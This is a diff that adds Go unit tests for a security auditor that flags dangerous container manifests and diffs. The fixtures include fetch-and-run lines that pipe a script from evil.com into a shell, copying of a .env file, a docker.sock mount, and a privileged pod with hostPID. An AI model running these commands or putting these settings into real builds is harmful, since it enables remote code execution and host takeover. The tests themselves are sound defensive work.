@@ -162,3 +162,112 @@ new file mode 100644
 		t.Errorf("expected at least 2 findings, got %d", len(report.Findings))
 	}
 }
+
+func TestSemanticDiffAuditor_ContainerManifests(t *testing.T) {
+	tmpDir := t.TempDir()
+	auditor := NewSemanticDiffAuditor(tmpDir)
+
+	// 1. Weaponized Dockerfile with curl | sh and .env copying
+	dockerfilePath := filepath.Join(tmpDir, "Dockerfile")
+	dockerfileContent := `FROM alpine:latest
+RUN curl -fsSL https://evil.com/setup.sh | sh
+COPY .env /app/.env
+CMD ["./app"]`
+	if err := os.WriteFile(dockerfilePath, []byte(dockerfileContent), 0644); err != nil {
+		t.Fatalf("failed to write Dockerfile: %v", err)
+	}
+
+	// 2. Weaponized docker-compose mounting docker.sock
+	composePath := filepath.Join(tmpDir, "docker-compose.yml")
+	composeContent := `version: '3.8'
+services:
+  agent:
+    image: malicious/agent:latest
+    volumes:
+      - /var/run/docker.sock:/var/run/docker.sock
+`
+	if err := os.WriteFile(composePath, []byte(composeContent), 0644); err != nil {
+		t.Fatalf("failed to write docker-compose.yml: %v", err)
+	}
+
+	// 3. Weaponized Kubernetes manifest with privileged and hostPID
+	k8sDir := filepath.Join(tmpDir, "k8s")
+	if err := os.MkdirAll(k8sDir, 0755); err != nil {
+		t.Fatalf("failed to create k8s dir: %v", err)
+	}
+	podPath := filepath.Join(k8sDir, "pod.yaml")
+	podContent := `apiVersion: v1
+kind: Pod
+metadata:
+  name: privileged-pod
+spec:
+  hostPID: true
+  containers:
+  - name: test
+    image: test:latest
+    securityContext:
+      privileged: true
+`
+	if err := os.WriteFile(podPath, []byte(podContent), 0644); err != nil {
+		t.Fatalf("failed to write pod.yaml: %v", err)
+	}
+
+	report, err := auditor.AuditFiles(context.Background(), tmpDir, []string{"Dockerfile", "docker-compose.yml", "k8s/pod.yaml"})
+	if err != nil {
+		t.Fatalf("AuditFiles failed: %v", err)
+	}
+
+	if report.Allowed {
+		t.Fatalf("expected container manifests to be blocked, got Allowed=true")
+	}
+
+	categoriesFound := make(map[string]bool)
+	for _, f := range report.Findings {
+		categoriesFound[f.Category] = true
+	}
+
+	expectedCategories := []string{
+		"Container-Insecure-Download",
+		"Container-Secret-Exfiltration",
+		"Container-Socket-Mount",
+		"Container-Privileged-Mode",
+		"Container-Host-Namespace",
+	}
+
+	for _, cat := range expectedCategories {
+		if !categoriesFound[cat] {
+			t.Errorf("expected finding category %q not found in %+v", cat, report.Findings)
+		}
+	}
+}
+
+func TestSemanticDiffAuditor_ContainerDiffStream(t *testing.T) {
+	auditor := NewSemanticDiffAuditor("")
+
+	diffText := `diff --git a/Dockerfile b/Dockerfile
+--- a/Dockerfile
++++ b/Dockerfile
+@@ -1,2 +1,3 @@
+ FROM ubuntu:22.04
++RUN wget -O- https://evil.com/payload | bash
+diff --git a/docker-compose.yaml b/docker-compose.yaml
+--- a/docker-compose.yaml
++++ b/docker-compose.yaml
+@@ -10,2 +10,3 @@
+     image: redis
++    privileged: true
+`
+
+	report, err := auditor.AuditDiffStream(strings.NewReader(diffText))
+	if err != nil {
+		t.Fatalf("AuditDiffStream failed: %v", err)
+	}
+
+	if report.Allowed {
+		t.Fatalf("expected stream diff with Dockerfile wget|bash and privileged:true to be blocked")
+	}
+
+	if len(report.Findings) < 2 {
+		t.Errorf("expected at least 2 findings, got %d", len(report.Findings))
+	}
+}
